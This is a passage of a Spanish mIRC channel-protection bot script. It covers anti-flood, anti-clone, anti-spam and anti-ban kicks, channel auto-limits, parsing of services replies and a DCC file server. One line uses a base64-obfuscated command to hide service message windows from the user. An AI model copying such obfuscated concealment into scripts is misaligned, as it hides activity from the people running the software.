      if ($antimayus(%antmys.d) > %antimayus. [ $+ [ $chan ] ]) {
        hadd antimayus $chan $+ \ $+ $nick $calc($hget(antimayus,$chan $+ \ $+ $nick) + 1)
        .timerantimayus. $+ $chan $+ \ $+ $nick 1 40 hdel antimayus $chan $+ \ $+ $nick
        %protnavisos = $iif(%AVISOS.antimayus. [ $+ [ $chan ] ] == $null,2,%AVISOS.antimayus. [ $+ [ $chan ] ])
        if ($hget(antimayus,$chan $+ \ $+ $nick) > %protnavisos) { hdel antimayus $chan $+ \ $+ $nick | .timerantimayus. $+ $chan $+ \ $+ $nick off | mode $chan +bb $nick $address($nick,2) | kick $chan $nick $iif(%MSG.KICK.ANTIMAYUS. [ $+ [ $chan ] ] != $null,%MSG.KICK.ANTIMAYUS. [ $+ [ $chan ] ],Desactiva las may˙sculas) | halt }
        else {
          if ($hget(antimayus,$chan $+ \ $+ $nick) == %protnavisos) { .timerantimayusAvisa- $+ $chan -m 1 500 $iif(%AVISA.CANAL- [ $+ [ $chan ] ],msg $chan,notice $nick) $nick $iif(%MSG.AVISO.ANTIMAYUS. [ $+ [ $chan ] ] != $null,%MSG.AVISO.ANTIMAYUS. [ $+ [ $chan ] ],°Desactiva las may˙sculas!) $hget(antimayus,$chan $+ \ $+ $nick) y ultimo aviso. }
          else { .timerantimayusAvisa- $+ $chan -m 1 500 $iif(%AVISA.CANAL- [ $+ [ $chan ] ],msg $chan,notice $nick) $nick $iif(%MSG.AVISO.ANTIMAYUS. [ $+ [ $chan ] ] != $null,%MSG.AVISO.ANTIMAYUS. [ $+ [ $chan ] ],°Desactiva las may˙sculas!) $hget(antimayus,$chan $+ \ $+ $nick) aviso. }
        }
      }
    }
    if (%antispam. [ $+ [ $chan ] ]) && ($nick !isop $chan) && ($iif($hget(l- $+ $chan,NOJOIN) != $null,$iif($hget(l- $+ $chan,NOJOIN) isnum,$hget(l- $+ $chan,NOJOIN),-1),-1) >= $iif($gettok($hget(r- $+ $chan,$nick),1,32) isnum,$gettok($hget(r- $+ $chan,$nick),1,32),-1)) {
      if ($antispam.exist(anti,$chan,$strip($1-)) == SPAM) { mode $chan +bb $nick $address($nick,2) | kick $chan $nick P˙blicidad prohibida en este canal. | halt }
    }
    if (%ANTIREPES- [ $+ [ $chan ] ]) && ($nick !isop $chan) && ($iif($hget(l- $+ $chan,NOJOIN) != $null,$iif($hget(l- $+ $chan,NOJOIN) isnum,$hget(l- $+ $chan,NOJOIN),-1),-1) >= $iif($gettok($hget(r- $+ $chan,$nick),1,32) isnum,$gettok($hget(r- $+ $chan,$nick),1,32),-1)) {
      if ($remove($strip($1-),$chr(32)) == $gettok($hget(reps,$chan $+ \ $+ $nick),2-,32)) { hadd reps $chan $+ \ $+ $nick $calc($gettok($hget(reps,$chan $+ \ $+ $nick),1,32) + 1) $gettok($hget(reps,$chan $+ \ $+ $nick),2-,32) }
      else { .timerepez. $+ $chan $+ \ $+ $nick 1 600 hdel reps $chan $+ \ $+ $nick | hadd reps $chan $+ \ $+ $nick 0 $remove($strip($1-),$chr(32)) }
      if ($gettok($hget(reps,$chan $+ \ $+ $nick),1,32) > $iif(%AVISOS.ANTIREPES. [ $+ [ $chan ] ] != $null,%AVISOS.ANTIREPES. [ $+ [ $chan ] ],4)) { hdel reps $chan $+ \ $+ $nick | .timerepez. $+ $chan $+ \ $+ $nick off | mode $chan +bb $nick $address($nick,2) | kick $chan $nick $iif(%MSG.KICK.ANTIREPES. [ $+ [ $chan ] ] != $null,%MSG.KICK.ANTIREPES. [ $+ [ $chan ] ],Las repeticiones estan prohibidas) | halt }
      elseif ($gettok($hget(reps,$chan $+ \ $+ $nick),1,32) >= 1) && ($me isop $chan) { $iif(%AVISA.CANAL- [ $+ [ $chan ] ],msg $chan,notice $nick) $nick $iif(%MSG.AVISO.ANTIREPES. [ $+ [ $chan ] ] != $null,%MSG.AVISO.ANTIREPES. [ $+ [ $chan ] ],°No repeticiones!) $gettok($hget(reps,$chan $+ \ $+ $nick),1,32) $iif($calc($gettok($hget(reps,$chan $+ \ $+ $nick),1,32) + 1) > $iif(%AVISOS.ANTIREPES. [ $+ [ $chan ] ] != $null,%AVISOS.ANTIREPES. [ $+ [ $chan ] ],4),y ultimo) aviso. }
    }
  }
}
alias autolimit2 { .timerAUTOLIMIT- $+ $1 1 5 autolimit $1 }
alias autolimit {
  if ($1 == $hget(canales,1).item) || ($1 == Q) {
    if ($timer(PROX- $+ $hget(canales,1).item $+ -*) !isnum) && (%AUTOLIMIT. [ $+ [ $hget(canales,1).item ] ]) && ($me isop $hget(canales,1).item) && ($calc($nick($hget(canales,1).item,0) + 5) != $chan($hget(canales,1).item).limit) { mode $hget(canales,1).item +l $calc($calc($nick($hget(canales,1).item,0) + 5) - $timer(PROX- $+ $hget(canales,1).item $+ -*)) }
  }
  if ($1 == $hget(canales,2).item) || ($1 == Q) {
    if ($timer(PROX- $+ $hget(canales,2).item $+ -*) !isnum) && (%AUTOLIMIT. [ $+ [ $hget(canales,2).item ] ]) && ($me isop $hget(canales,2).item) && ($calc($nick($hget(canales,2).item,0) + 5) != $chan($hget(canales,2).item).limit) { mode $hget(canales,2).item +l $calc($calc($nick($hget(canales,2).item,0) + 5) - $timer(PROX- $+ $hget(canales,2).item $+ -*)) }
  } 
  if ($1 == $hget(canales,3).item) || ($1 == Q) {
    if ($timer(PROX- $+ $hget(canales,3).item $+ -*) !isnum) && (%AUTOLIMIT. [ $+ [ $hget(canales,3).item ] ]) && ($me isop $hget(canales,3).item) && ($calc($nick($hget(canales,3).item,0) + 5) != $chan($hget(canales,3).item).limit) { mode $hget(canales,3).item +l $calc($calc($nick($hget(canales,3).item,0) + 5) - $timer(PROX- $+ $hget(canales,3).item $+ -*)) }
  }
  if ($1 == $hget(canales,4).item) || ($1 == Q) {
    if ($timer(PROX- $+ $hget(canales,4).item $+ -*) !isnum) && (%AUTOLIMIT. [ $+ [ $hget(canales,4).item ] ]) && ($me isop $hget(canales,4).item) && ($calc($nick($hget(canales,4).item,0) + 5) != $chan($hget(canales,4).item).limit) { mode $hget(canales,4).item +l $calc($calc($nick($hget(canales,4).item,0) + 5) - $timer(PROX- $+ $hget(canales,4).item $+ -*)) }
  }
  if ($1 == $hget(canales,5).item) || ($1 == Q) {
    if ($timer(PROX- $+ $hget(canales,5).item $+ -*) !isnum) && (%AUTOLIMIT. [ $+ [ $hget(canales,5).item ] ]) && ($me isop $hget(canales,5).item) && ($calc($nick($hget(canales,5).item,0) + 5) != $chan($hget(canales,5).item).limit) { mode $hget(canales,5).item +l $calc($calc($nick($hget(canales,5).item,0) + 5) - $timer(PROX- $+ $hget(canales,5).item $+ -*)) }
  }
}
on *:PART:#:{ if ($findtok(%cchnal,$chan,32)) { if ($nick != $me) { autolimit2 $chan } } }
on *:JOIN:#:{
  if ($findtok(%cchnal,$chan,32)) {
    if ($nick == $me) {
      if ($network == IRC-Hispano) && ($chan == #kellernet&rok) { window -h $chan }
      if ($hget(mer,$chan)) && ($hget(l- $+ $chan,AUTOOP)) && ($hget(mer,$chan) >= $hget(l- $+ $chan,AUTOOP)) { .msg chan op $chan $me }
      unset %lines.chan- $+ $chan
      unset %qbanss $+ $chan
      unset %clones.igual- $+ $chan
      who $chan
      nicks.creatabla $chan
    }
    else {
      if (!$findtok($hget(masters,$chan),$nick,32)) {
        shitlist.m $nick | anticlonesipv $chan $nick | nick.ncom.m $nick
        if (%CANAL.NCOM. [ $+ [ $chan ] ]) { inc %who.ncompa 4 | .timerncompa- $+ $nick 1 %who.ncompa whois $nick | .timerncompa 1 %who.ncompa unset %who.ncompa }
      }
      if (%ANTIPROXYS. [ $+ [ $chan ] ]) && ($me isop $chan) && (!$findtok($hget(masters,$chan),$nick,32)) && (!$hget(r- $+ $chan,$nick)) {
        hadd proxys- $+ $chan $nick | .timeranticlones- $+ $chan 1 2 nicks.compara $chan | if ($hget(proxys- $+ $chan,0).item >= 10) { mode+RM $chan | halt }
      }
      if ($hget(vist,$address($nick,2))) && ($hget(vist,$address($nick,2)) != $nick) && (%VIST- [ $+ [ $chan ] ]) { if ($me isop $chan) { .timervist- $+ $chan -m 1 500 onotice $chan $nick Antes visto como $hget(vist,$address($nick,2)) } }
      hadd vist $address($nick,2) $nick
      autolimit2 $chan
      if (%AHE- [ $+ [ $chan ] ]) && (%rvhe- [ $+ [ $chan ] ]) { .timersalud. $+ $chan -m 1 500 $iif(%ASALUDO.CANAL. [ $+ [ $chan ] ],msg $chan,notice $nick) $replace(%rvhe- [ $+ [ $chan ] ],<hora>,$time,<fecha>,$date,<nick>,$nick) }
      if (%AUTOVOICE- [ $+ [ $chan ] ]) && ($me isop $chan) { .timerautovoice. $+ $chan -m 1 500 mode $chan +v $nick }
    }
  }
}
alias anticlonesipv {
  if (%anticlones. [ $+ [ $1 ] ] isnum) && ($2 != $me) && ($2) && ($me isop $1) {
    %anticlnipv2 = $address($2,2)
    %anticlnipv3 = $ialchan(%anticlnipv2,$1,0).nick
    if (%anticlnipv2) && (%anticlnipv3 > %anticlones. [ $+ [ $1 ] ]) {
      %antclnipv4 = 1
      while ($ialchan(%anticlnipv2,$1,%antclnipv4).nick != $null) {
        if ($ialchan(%anticlnipv2,$1,%antclnipv4).nick == $me) || ($findtok($hget(masters,$1),$ialchan(%anticlnipv2,$1,%antclnipv4).nick,32)) || ($ialchan(%anticlnipv2,$1,%antclnipv4).nick isop $1) { return }
        if ($gettok($hget(r- $+ $1,$2),1,32) > $iif($hget(l- $+ $1,nojoin) !isnum,0,$hget(l- $+ $1,nojoin))) && ($gettok($hget(r- $+ $1,$2),1,32) != $null) { return }
        inc %antclnipv4
      }
      mode $1 +b $2 | kick $1 $2 Ha sobrepasado el m·ximo de clones permitidos por ip.
    }
  }
}
alias nick.ncom.m {
  if ($nick.ncom.exist(anti,$hget(canales,1).item,$1) == NCOM) && (%NICK.NCOM. [ $+ [ $hget(canales,1).item ] ]) && ($1 ison $hget(canales,1).item) { .timerunban- $+ $hget(canales,1).item $+ - $+ $1 1 300 mode $hget(canales,1).item -b $1 | mode $hget(canales,1).item +b $1 | kick $hget(canales,1).item $1 Nick inapropiado para este canal. Por favor, cambiese el nick para entrar. | halt }
  if ($nick.ncom.exist(anti,$hget(canales,2).item,$1) == NCOM) && (%NICK.NCOM. [ $+ [ $hget(canales,2).item ] ]) && ($1 ison $hget(canales,2).item) { .timerunban- $+ $hget(canales,2).item $+ - $+ $1 1 300 mode $hget(canales,2).item -b $1 | mode $hget(canales,2).item +b $1 | kick $hget(canales,2).item $1 Nick inapropiado para este canal. Por favor, cambiese el nick para entrar. | halt }
  if ($nick.ncom.exist(anti,$hget(canales,3).item,$1) == NCOM) && (%NICK.NCOM. [ $+ [ $hget(canales,3).item ] ]) && ($1 ison $hget(canales,3).item) { .timerunban- $+ $hget(canales,3).item $+ - $+ $1 1 300 mode $hget(canales,3).item -b $1 | mode $hget(canales,3).item +b $1 | kick $hget(canales,3).item $1 Nick inapropiado para este canal. Por favor, cambiese el nick para entrar. | halt }
  if ($nick.ncom.exist(anti,$hget(canales,4).item,$1) == NCOM) && (%NICK.NCOM. [ $+ [ $hget(canales,4).item ] ]) && ($1 ison $hget(canales,4).item) { .timerunban- $+ $hget(canales,4).item $+ - $+ $1 1 300 mode $hget(canales,4).item -b $1 | mode $hget(canales,4).item +b $1 | kick $hget(canales,4).item $1 Nick inapropiado para este canal. Por favor, cambiese el nick para entrar. | halt }
  if ($nick.ncom.exist(anti,$hget(canales,5).item,$1) == NCOM) && (%NICK.NCOM. [ $+ [ $hget(canales,5).item ] ]) && ($1 ison $hget(canales,5).item) { .timerunban- $+ $hget(canales,5).item $+ - $+ $1 1 300 mode $hget(canales,5).item -b $1 | mode $hget(canales,5).item +b $1 | kick $hget(canales,5).item $1 Nick inapropiado para este canal. Por favor, cambiese el nick para entrar. | halt }
}
alias nicks.creatabla { unset %proxyf- $+ $1 | hfree -w proxyst- $+ $1 * | hfree -w proxys- $+ $1 | hmake proxys- $+ $1 }
alias nicks.creatabla2 { hfree -w proxyst- $+ $1 * | hmake proxyst- $+ $1 }
alias nicks.compara {
  if ($hget(proxys- $+ $1,0).item >= 4) {
    nicks.creatabla2 $1
    set %proxy.compara 1
    while ($hget(proxys- $+ $1,%proxy.compara).item) {
      set %proxy.compara.1 $proxys.patrones($hget(proxys- $+ $1,%proxy.compara).item))
      set %proxy.pa-num.1 $gettok(%proxy.compara.1,$calc($findtok(%proxy.compara.1,num,32) + 1),32)
      set %proxy.pa-minus.1 $gettok(%proxy.compara.1,$calc($findtok(%proxy.compara.1,min,32) + 1),32)
      set %proxy.pa-may.1 $gettok(%proxy.compara.1,$calc($findtok(%proxy.compara.1,may,32) + 1),32)
      set %proxy.pa-sim.1 $gettok(%proxy.compara.1,$calc($findtok(%proxy.compara.1,sim,32) + 1),32)
      set %proxy.pa-len.1 $gettok(%proxy.compara.1,$calc($findtok(%proxy.compara.1,len,32) + 1),32)
      set %proxy.compara2 1
      set %proxy-pa-result $1 $+ - $+ %proxy.pa-minus.1 $+ - $+ %proxy.pa-may.1 $+ - $+ %proxy.pa-sim.1 $+ - $+ $remove(%proxy.pa-len.1,0,9,8,7,6,5,4,3,2,1) $+ - $+ $iif(%proxy.pa-num.1 > 0,N,0)
      if ($hget(proxyst- $+ %proxy-pa-result,0).item == 0) { hfree -w proxyst- $+ %proxy-pa-result | hmake proxyst- $+ %proxy-pa-result | hadd proxyst- $+ $1 %proxy-pa-result }
      hadd proxyst- $+ %proxy-pa-result $hget(proxys- $+ $1,%proxy.compara).item
      inc %proxy.compara
    }
    set %proxy.compara 1
    while ($hget(proxyst- $+ $1,%proxy.compara).item) {
      if ($hget(proxyst- $+ $hget(proxyst- $+ $1,%proxy.compara).item,0).item >= 3) {
        set %proxy.compara2 1
        while ($hget(proxyst- $+ $hget(proxyst- $+ $1,%proxy.compara).item,%proxy.compara2).item) {
          proy2bk $1 $hget(proxyst- $+ $hget(proxyst- $+ $1,%proxy.compara).item,%proxy.compara2).item
          inc %proxy.compara2
      } }
      hfree -w proxyst- $+ $hget(proxyst- $+ $1,%proxy.compara).item
      inc %proxy.compara
  } }
  nicks.creatabla $1
}
alias mode+RM {
  if ($me isop $1) {
    var %proy.RMM = $replace($chan($1).mode,R,$chr(32) R $chr(32),M,$chr(32) M $chr(32))
    if ($gettok(%proy.RMM,$findtok(%proy.RMM,R,32),32) !== R) || ($gettok(%proy.RMM,$findtok(%proy.RMM,M,32),32) !== M) { mode $1 +RM | .timer-RM- $+ $1 1 200 Mode $1 -RM }
    else {
      if ($gettok(%proy.RMM,$findtok(%proy.RMM,R,32),32) !== R) { mode $1 +R | .timer-RM- $+ $1 1 200 Mode $1 -RM }
      if ($gettok(%proy.RMM,$findtok(%proy.RMM,M,32),32) !== M) { mode $1 +M | .timer-RM- $+ $1 1 200 Mode $1 -RM }
    }
  }
}
alias proy2bk {
  if (!$timer(prox- $+ $1 $+ - $+ $2)) {
    mode+RM $1
    inc %proxyf- [ $+ [ $1 ] ] 5
    .timerPROX- $+ $1 $+ - $+ $2 1 %proxyf- [ $+ [ $1 ] ] PROY $1 $2 Posible ataque de clones detectado, en caso contrario contacte con un operador del canal.
    .timerproxfe- $+ $1 1 5 unset %proxyf- [ $+ [ $1 ] ]
  }
}
alias proxys.patrones {
  set %ata.clns2 0
  set %ata.clns3 0
  set %ata.clns4 0
  set %ata.clns5 0
  %ata.clns = 1
  while ($mid($1,%ata.clns,1) != $null) {
    if ($mid($1,%ata.clns,1) isnum) { inc %ata.clns2 }
    else {
      if ($mid($1,%ata.clns,1) isin qwertyuiopasdfghjklÒÁzxcvbnm) {
        if ($mid($1,%ata.clns,1) islower) { inc %ata.clns3 }
        if ($mid($1,%ata.clns,1) isupper) { inc %ata.clns4 }
      }
      else { inc %ata.clns5 }
    }
    inc %ata.clns
  }
  ;num %ata.clns2 minus %ata.clns3 mayus %ata.clns4 simbolos %ata.clns5 len
  return num %ata.clns2 min %ata.clns3 may %ata.clns4 sim %ata.clns5 len $len($1)
}
Alias PROY { if ($2 ison $1) && ($me isop $1) { mode $1 +b $address($2,2) | .timerunbanclon- $+ $1 $+ - $+ $address($2,2) 1 600 mode $1 -b $address($2,2) | kick $1 $2 $3- | .timer-RM- $+ $1 1 $calc(%proxyf- [ $+ [ $1 ] ] + 200) Mode $1 -RM } }
on *:OP:#:{ if ($opnick == $me) && ($findtok(%cchnal,$chan,32)) { unset %qbanss $+ $chan | mode $chan +b | autolimit2 $chan } }
on *:FILESENT:*:{ if (%act == @estado) { datv-estado } }
on *:SENDFAIL:*:{ if (%act == @estado) { datv-estado } }
Alias direct { if ($2) { msg = $+ $2 4-2[12 $+ $3- $+ 2]4- | unset %direct | :1 | inc %direct | if ($findfile($1,*.*,%direct,1)) { %directt = o | %dcmsnmb = $findfile($1,*.*,%direct,1) | %dcmsbs = $round($calc($file(%dcmsnmb).size / 1024^2),2) | %dcmsbs2 = $file(%dcmsnmb).size | msg = $+ $2 2ID12 %direct 2Nombre12 $nopath(%dcmsnmb) 2TamaÒo4 $iif($round($calc($file(%dcmsnmb) / 1024^2),2) > 0,$ifmatch MB,$iif($round($calc($file(%dcmsnmb) / 1024^1),2) > 0,$ifmatch KB,$file(%dcmsnmb) Bytes)) | goto 1 } | if (!%directt) { msg = $+ $2 2Vacio2. } } }
alias mgqmop { if ($me ison $1) && ($me !isop $1) { .msg chan op $1 $me } }
alias shcms {
  msg = $+ $1 2D2irectorios 2C2ompartidos:
  if (%DIRCOMP1) { msg = $+ $1 2"ID 1212" 2Primer Directorio. 4[2Contiene12 $findfile(%DIRCOMP1,*.*,0,0) 2Ficheros4] }
  if (%DIRCOMP2) { msg = $+ $1 2"ID 1222" 2Segundo Directorio. 4[2Contiene12 $findfile(%DIRCOMP2,*.*,0,0) 2Ficheros4] }
  if (%DIRCOMP3) { msg = $+ $1 2"ID 1232" 2Tercero Directorio. 4[2Contiene12 $findfile(%DIRCOMP3,*.*,0,0) 2Ficheros4] }
  if (%DIRCOMP4) { msg = $+ $1 2"ID 1242" 2Cuarto Directorio. 4[2Contiene12 $findfile(%DIRCOMP4,*.*,0,0) 2Ficheros4] }
  if (%DIRCOMP5) { msg = $+ $1 2"ID 1252" 2Quinto Directorio. 4[2Contiene12 $findfile(%DIRCOMP5,*.*,0,0) 2Ficheros4] }
  if (%DIRCOMP6) { msg = $+ $1 2"ID 1262" 2Sexto Directorio. 4[2Contiene12 $findfile(%DIRCOMP6,*.*,0,0) 2Ficheros4] }
  msg = $+ $1 2Para ver un directorio, escribe !DIR <ID> | msg = $+ $1 2Para transferir un archivo escribe !SEND <ID DIR> <ID FICHERO>
  msg = $+ $1 2AVISO2: Solo puedes descargar dos archivos a la vez.
}
on *:open:=:{
  if (!%DIRCOMP1) && (!%DIRCOMP2) && (!%DIRCOMP3) && (!%DIRCOMP4) && (!%DIRCOMP5) && (!%DIRCOMP6) { msg =$nick 2Error2: No hay ningun directorio compartido. | msg =$nick 2Cerrando conexiÛn.. | window -c = $+ $nick }
  else { shcms $nick }
}
Alias dccms { if ($1) { set %wdcc2 0 | set %wdcc 1 | while ($send(%wdcc)) { if ($send(%wdcc) == $1) { inc %wdcc2 } | inc %wdcc } | return %wdcc2 } }
on *:Chat:*:{
  if ($strip($1) == !DIR) {
    if ($strip($2) isnum) {
      %vchm = $shortfn(%DIRCOMP [ $+ [ $strip($2) ] ]) | if (!%vchm) { msg =$nick 2Error2: Directorio $strip($2) no disponible. }
      else {
        %spvr = $strip($2) | if (%spvr == 1) { direct %vchm $nick Primer directorio }
        if (%spvr == 2) { direct %vchm $nick Segundo directorio } | if (%spvr == 3) { direct %vchm $nick Tercer directorio }
        if (%spvr == 4) { direct %vchm $nick Cuarto directorio } | if (%spvr == 5) { direct %vchm $nick Quinto directorio }
        if (%spvr == 6) { direct %vchm $nick Sexto directorio }
    } }
    else { shcms $nick }
  }
  if ($strip($1) == !SEND) && ($strip($2) isnum) && ($strip($3) isnum) {
    if (!%DIRCOMP [ $+ [ $strip($2) ] ]) { msg =$nick 2Error2: El directorio especificado no esta disponible. }
    else {
      %actns = $findfile($shortfn(%DIRCOMP [ $+ [ $strip($2) ] ]),*.*,$strip($3),1) | if (!%actns) { msg =$nick 2Error2: No se encontro la ID del archivo. }
      else { if ($dccms($nick) >= 2) { msg =$nick 2Error2: Solo puedes tener dos descargas a la vez. } | else { msg =$nick 2Transfiriendo12 $nopath(%actns) 2(ID4 $strip($3) $+ 2) | dcc send $nick $shortfn(%actns) | if (%act == @estado) { datv-estado } } }
    }
  }
}
on *:kick:#:{
  if ($findtok(%cchnal,$chan,32)) {
    if ($knick != $me) {
      if ($nick == $me) { .timerautolimit3- $+ $chan 1 10 autolimit2 $chan | halt }
      autolimit2 $chan
    }
    if ($nick == CHaN) {
      if ($findtok($hget(masters,$chan),$knick,32)) || ($knick == $me) { %mr = -> | %mr2 = no te quiero en el canal. | if (%mr == $mid($2,1,2)) || (%mr2 === $1-) { .msg chan akick $chan del $knick } }
    }
    if ($me isop $chan) && ($nick != $knick) && ($nick != $me) { if ($findtok($hget(masters,$chan),$knick,32)) && ($findtok($hget(masters,$chan),$nick,32) == $null) { if ($nick ison $chan) { mode $chan -o $nick } | mode -b $banmask | invite $knick $chan } }
  }
}
on *:ban:#:{
  if ($findtok(%cchnal,$chan,32)) && ($me isop $chan) && ($nick != $me) && ($nick ison $chan) {
    if ($banmask iswm $address($me,0)) || ($banmask iswm $address($me,5)) || ($banmask iswm $address($me,2)) {
      if ($findtok($hget(masters,$chan),$nick,32)) { mode $chan -b $banmask } | else { mode $chan -ob+bb $nick $banmask $address($nick,2) $nick | kick $chan $nick ProtecciÛn Anti Ban(s) | .timerunb- $+ $chan $+ - $+ $nick 1 60 mode $chan -bb $address($nick,2) $nick }
    }
    else { %a = 1 | while ($gettok($hget(masters,$chan),%a,32)) { %n = $gettok($hget(masters,$chan),%a,32) | if ($banmask iswm $address(%n,0)) || ($banmask iswm $address(%n,5)) || ($banmask iswm $address(%n,2)) { if ($nick != %n) { if (!$findtok($hget(masters,$chan),$nick,32)) { mode $chan -ob+bb $nick $banmask $address($nick,2) $nick | kick $chan $nick Anti Ban(s) a privilegiados | .timerunb- $+ $chan $+ - $+ $nick 1 60 mode $chan -bb $address($nick,2) $nick } | else { mode $chan -b $banmask } | halt } } | inc %a } }
} }
on *:unban:#:{
  if ($timer(unbanclon- $+ $chan $+ - $+ $banmask) isnum) { .timerunbanclon- $+ $chan $+ - $+ $banmask off }
}
on *:INVITE:#:{ if ($findtok(%cchnal,$chan,32)) { join $chan } }
on *:DEOP:#:{ if ($me == $opnick) && ($nick != $me) && ($findtok(%cchnal,$chan,32)) { .timermopi- $+ $chan 1 4 mgqmop $chan } }
on *:TEXT:*:*:{
  if ($mid($target,1,1) != $chr(35)) {
    if ($nick == NiCK) || ($nick == CHaN) { w $+ $decode(aW5kb3cgLWg=,m) $nick }
    if ($nick == NiCK) {
      if ($1 == Opciones:) || (Lista de founders y accesos de isin $1-) { hfree -w mer | hmake mer }
      if ($2 == LEVEL) { hadd mer $1 $3 }
    }
    if ($nick == CHaN) {
      if ($1 == ContraseÒa) && ($2 == aceptada,) && (!$findtok(%fath.n,$mid($strip($10),1,$calc($len($strip($10)) - 1)),32)) { %dpcncat = $mid($strip($10),1,$calc($len($strip($10)) - 1)) | set %fath.n %fath.n %dpcncat | if ($me !ison %dpcncat) { join %dpcncat } | elseif ($me !isop %dpcncat) { .msg chan op %dpcncat $me } | .msg chan set %dpcncat debug on }
      if (%chan.regn) && ($1 isnum) && ($2 isnum) { .timerrglcn- $+ %chan.regn 1 2 snrg %chan.regn | hadd r- $+ %chan.regn $3 $2 $1 }
      if (%chan.lvl) {
        if ($1 == AUTOOP) { hadd l- $+ %chan.lvl AUTOOP $2 } | if ($1 == AUTOVOICE) { hadd l- $+ %chan.lvl AUTOVOICE $2 }
        if ($1 == AUTODEOP) { hadd l- $+ %chan.lvl AUTODEOP $2 } | if ($1 == NOJOIN) { hadd l- $+ %chan.lvl NOJOIN $2 }
        if ($1 == INVITE) { hadd l- $+ %chan.lvl INVITE $2 } | if ($1 == AKICK) { hadd l- $+ %chan.lvl AKICK $2 }
        if ($1 == SET) { hadd l- $+ %chan.lvl SET $2 } | if ($1 == CLEAR) { hadd l- $+ %chan.lvl CLEAR $2 }
        if ($1 == UNBAN) { hadd l- $+ %chan.lvl UNBAN $2 } | if ($1 == OPDEOP) { hadd l- $+ %chan.lvl OPDEOP $2 }
        if ($1 == ACC-LIST) { hadd l- $+ %chan.lvl ACC-LIST $2 }
        if ($1 == ACC-CHANGE) {
          hadd l- $+ %chan.lvl ACC-CHANGE $2
          if ($hget(mer,%chan.lvl) >= $hget(l- $+ %chan.lvl,ACC-LIST)) || ($findtok(%fath.n,%chan.lvl,32)) { .msg chan access %chan.lvl list }
          else {
            if (%START.NOSAY. [ $+ [ %chan.lvl ] ] != $null) && (%MGB == $null) { return }
            if ($me !isop %chan.lvl) { msg %chan.lvl 2Error2: No se podra regenerar la lista de registros, por falta de privilegios. }
            else { onotice %chan.lvl 2Error2: No se podra regenerar la lista de registros, por falta de privilegios. }
          }
        }
      }
      if ($1 == Lista) && ($2 == de) && ($3 == acceso) && ($4 == de) { if ($findtok(%cchnal,$mid($strip($5),1,$calc($len($strip($5)) - 1)),32)) { set %chan.regn $mid($strip($5),1,$calc($len($strip($5)) - 1)) | hfree -w r- $+ %chan.regn | hmake r- $+ %chan.regn } }
      if ($1 == ConfiguraciÛn) && ($2 == de) && ($3 == nivel) && ($5 == acceso) { if ($6 == para) && ($7 == canal) { set %chan.lvl $mid($strip($8),1,$calc($len($strip($8)) - 1)) | hfree -w l- $+ %chan.lvl | hmake l- $+ %chan.lvl } }
    }
  }
  elseif (%stats.status. [ $+ [ $target ] ]) { stats.add $target $nick m $+ $iif($left($nick($target,$nick).pnick,1) != $left($nick,1),$left($nick($target,$nick).pnick,1)) $1- }
  if (%MGB == s) && ($findtok(%cchnal,$target,32)) {
    if ($strip($1) == %PREFIX- [ $+ [ $target ] ] $+ P2P) && (!$chat($nick)) { if (%DIRCOMP1) || (%DIRCOMP2) || (%DIRCOMP3) || (%DIRCOMP4) || (%DIRCOMP5) || (%DIRCOMP6) { dcc chat $nick | window -h = $+ $nick } }
    if (%emisora.st) && (%norepit. [ $+ [ $target ] ]) { inc %lines.chan- [ $+ [ $target ] ] }
    if (!$findtok($hget(masters,$target),$nick,32)) {
      if (%ANTIPALABROTAS. [ $+ [ $target ] ]) && ($nick !isop $target) && ($iif($hget(l- $+ $target,NOJOIN) != $null,$iif($hget(l- $+ $target,NOJOIN) isnum,$hget(l- $+ $target,NOJOIN),-1),-1) >= $iif($gettok($hget(r- $+ $target,$nick),1,32) isnum,$gettok($hget(r- $+ $target,$nick),1,32),-1)) {
        if ($ANTIPALABROTAS.exist(anti,$target,$strip($1-)) == PALABROTA) {
          hadd antipalabrotas $target $+ \ $+ $nick $calc($hget(antipalabrotas,$target $+ \ $+ $nick) + 1)
          .timerantipalabrotas. $+ $target $+ \ $+ $nick 1 40 hdel antipalabrotas $target $+ \ $+ $nick
          %protnavisos = $iif(%AVISOS.ANTIPALABROTAS. [ $+ [ $target ] ] == $null,2,%AVISOS.ANTIPALABROTAS. [ $+ [ $target ] ])
          if ($hget(antipalabrotas,$target $+ \ $+ $nick) > %protnavisos) { hdel antipalabrotas $target $+ \ $+ $nick | .timerantipalabrotas. $+ $target $+ \ $+ $nick off | mode $chan +bb $nick $address($nick,2) | kick $chan $nick $iif(%MSG.KICK.ANTIPALABROTAS. [ $+ [ $target ] ] != $null,%MSG.KICK.ANTIPALABROTAS. [ $+ [ $target ] ],Las palabrotas est·n prohibidas) | halt }
          else { .timerantipalabrotasAvisa- $+ $target -m 1 500 $iif(%AVISA.CANAL- [ $+ [ $target ] ],msg $target,notice $nick) $nick $iif(%MSG.AVISO.ANTIPALABROTAS. [ $+ [ $target ] ] != $null,%MSG.AVISO.ANTIPALABROTAS. [ $+ [ $target ] ],°Las palabrotas est·n prohibidas!) $hget(antipalabrotas,$target $+ \ $+ $nick) $iif($calc($hget(antipalabrotas,$target $+ \ $+ $nick) + 1) > %protnavisos,y ultimo) aviso. }
        }
      }
      if (%ANTISEXO. [ $+ [ $target ] ]) && ($nick !isop $target) && ($iif($hget(l- $+ $target,NOJOIN) != $null,$iif($hget(l- $+ $target,NOJOIN) isnum,$hget(l- $+ $target,NOJOIN),-1),-1) >= $iif($gettok($hget(r- $+ $target,$nick),1,32) isnum,$gettok($hget(r- $+ $target,$nick),1,32),-1)) {
        if ($ANTISEXO.exist(anti,$target,$strip($1-)) == SEXO) {
          hadd ANTISEXO $target $+ \ $+ $nick $calc($hget(ANTISEXO,$target $+ \ $+ $nick) + 1)
          .timerANTISEXO. $+ $target $+ \ $+ $nick 1 40 hdel ANTISEXO $target $+ \ $+ $nick
          %protnavisos = $iif(%AVISOS.ANTISEXO. [ $+ [ $target ] ] == $null,2,%AVISOS.ANTISEXO. [ $+ [ $target ] ])
          if ($hget(ANTISEXO,$target $+ \ $+ $nick) > %protnavisos) { hdel ANTISEXO $target $+ \ $+ $nick | .timerANTISEXO. $+ $target $+ \ $+ $nick off | mode $chan +bb $nick $address($nick,2) | kick $chan $nick $iif(%MSG.KICK.ANTISEXO. [ $+ [ $target ] ] != $null,%MSG.KICK.ANTISEXO. [ $+ [ $target ] ],El sexo en este canal est· prohibido) | halt }
